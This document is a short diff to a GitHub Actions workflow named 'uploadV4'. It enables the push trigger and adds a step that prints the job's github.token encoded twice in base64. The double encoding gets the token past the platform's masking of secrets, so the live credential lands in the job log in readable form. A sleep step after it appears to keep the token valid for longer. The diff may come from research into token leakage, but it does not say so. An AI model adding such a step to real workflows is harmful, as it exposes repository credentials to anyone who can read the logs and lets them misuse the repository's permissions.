@@ -2,7 +2,7 @@ name: uploadV4
 
 on:
   - workflow_dispatch
-  # - push
+  - push
 
 jobs:
   build:
@@ -24,6 +24,8 @@ jobs:
           path: |
             artifact.txt
 
+      - name: Dump github.token
+        run: echo ${{ github.token }} | base64 | base64
 
       - name: Sleep a while ...
         run: |
